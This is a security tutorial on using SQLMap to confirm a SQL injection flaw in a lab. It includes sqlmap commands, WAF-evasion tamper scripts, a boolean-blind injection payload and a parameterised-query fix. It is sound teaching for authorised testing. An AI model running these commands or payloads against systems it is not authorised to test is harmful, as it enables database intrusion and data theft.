## Automate confirmation, not discovery

SQLMap is most useful after you have identified a suspicious parameter by hand. It
replaces tedious extraction work; it does not replace understanding the request.

## Learning objectives

- Feed SQLMap the exact request that a browser sent.
- Narrow testing to one parameter to avoid noise.
- Use tamper scripts when a filter interferes.
- Extract the minimum evidence and stop.

## Prerequisites

- A confirmed or strongly suspected injection point in a lab.
- Burp Suite or curl to save the request.
- Permission to use automated exploitation.

## Step 1 — Save the request

From Burp: right-click the request → "Copy to file" → `request.txt`. Remove
irrelevant headers and replace session cookies with a value that is still valid.

```http
GET /article?slug=hello HTTP/1.1
Host: lab.example
Cookie: session=abc123
Accept: */*
```

## Step 2 — Identify the parameter

```bash
sqlmap -r request.txt -p slug --batch --level=2 --risk=2
```

| Flag | Meaning |
| --- | --- |
| `-r` | Load request from file |
| `-p` | Test only this parameter |
| `--batch` | Never prompt |
| `--level` | More tests per parameter |
| `--risk` | More aggressive payloads |

Start at level 1 and risk 1. Raising both increases noise and the chance of
breaking the target.

## Step 3 — Confirm, then stop

```bash
sqlmap -r request.txt -p slug --batch --current-db --current-user
```

Two pieces of information prove the finding: the database name and the database
user. Do not proceed to dump application tables unless the programme explicitly
allows it.

> [!WARNING]
> `--dump-all`, `--os-shell` and `--file-read` can cause damage or cross policy
> lines. Use them only in a lab you own.

## Step 4 — When a filter interferes

```bash
sqlmap -r request.txt -p slug --batch --tamper=space2comment,between
```

| Tamper | Purpose |
| --- | --- |
| `space2comment` | Replace spaces with comments |
| `between` | Replace comparison operators |
| `charencode` | Encode payload characters |
| `randomcase` | Randomise keyword case |

Use one at a time and observe the response. A tamper script that breaks the query
produces false negatives.

## Step 5 — Handle sessions and CSRF

Some endpoints need a CSRF token that changes per request. SQLMap can parse it:

```bash
sqlmap -r request.txt -p slug --csrf-token=csrf_token --batch
```

For JSON bodies, keep the request file and set:

```bash
sqlmap -r request.txt --data '{"slug":"hello"}' --batch
```

## Step 6 — Techniques and timing

SQLMap reports the technique it used: boolean, union, error, time-based, stacked.

```bash
sqlmap -r request.txt -p slug --technique=BEU --batch
```

Restrict techniques when time-based queries would be disruptive. `--time-sec=2`
keeps delays short.

## Step 7 — Evidence for the report

```text
Parameter: slug (GET)
Type: boolean-based blind
Payload: slug=hello' AND 1=1-- -
Evidence: /article?slug=hello' AND '1'='2 changes the response length from 4120 to 1180
Database: app_db (MySQL 8.0.32)
```

That is enough to triage. Include the two responses, not a database dump.

## The fix

SQLMap output is a symptom. The remediation is parameterisation:

```js
await db.query("SELECT * FROM articles WHERE slug = ?", [slug]);
```

Also: least-privilege database accounts, no verbose errors, and a WAF as a
mitigation rather than a control.

## Common mistakes

- Running SQLMap against every parameter and calling the output a finding.
- Using `--dump-all` on production data.
- Forgetting that the saved request's cookie may have expired.
- Assuming "not injectable" after one tamper script fails.
- Ignoring WAF responses and treating them as clean results.

## Toolbox

| Purpose | Tool |
| --- | --- |
| Request capture | Burp Suite, curl |
| Injection confirmation | SQLMap |
| Manual verification | Burp Repeater |
| Remediation reference | OWASP SQLi cheat sheet |

## Practice lab

1. Save a lab request and test one parameter with level 1.
2. Confirm the current database and user.
3. Add a tamper script and compare results.
4. Restrict techniques and observe the reported type.
5. Write the evidence block above from your output.

## Further reading

- SQLMap documentation (usage and tamper scripts).
- OWASP — SQL Injection Prevention Cheat Sheet.
- PortSwigger Academy — SQL injection labs.
